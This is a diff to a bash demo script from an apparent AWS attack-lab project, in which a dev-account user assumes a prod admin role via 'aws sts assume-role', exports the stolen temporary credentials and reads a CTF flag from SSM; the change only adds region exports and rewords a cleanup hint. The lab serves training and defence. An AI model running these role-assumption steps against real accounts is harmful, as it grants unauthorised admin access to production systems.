@@ -121,6 +121,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials (dev account)${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -138,6 +139,7 @@ echo -e "${GREEN}✓ Verified starting user identity in dev account${NC}\n"
 echo -e "${YELLOW}Step 3: Identifying accounts${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 DEV_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Dev Account ID: $DEV_ACCOUNT_ID"
@@ -150,6 +152,7 @@ echo -e "${GREEN}✓ Extracted account IDs${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin access in prod yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users in prod account (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -163,6 +166,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Assuming the target role in prod account${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 
 show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name cross-account-demo-session --query 'Credentials' --output json"
@@ -176,6 +180,7 @@ export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # [OBSERVATION] Verify we assumed the role
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -215,6 +220,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Capturing the CTF flag${NC}"
 # Still operating with prod admin role credentials from the assume-role step
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Reading flag from SSM Parameter Store in prod account..."
 
 show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/dev-to-prod-simple-role-assumption-to-admin --query 'Parameter.Value' --output text"
@@ -261,7 +267,7 @@ echo -e "\n${BLUE}i This demonstrates a cross-account privilege escalation path$
 echo -e "${BLUE}An attacker with dev account credentials can gain admin access to prod${NC}"
 
 echo -e "\n${YELLOW}To clean up (no cleanup needed for this scenario):${NC}"
-echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
+echo "  run plabs cleanup or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
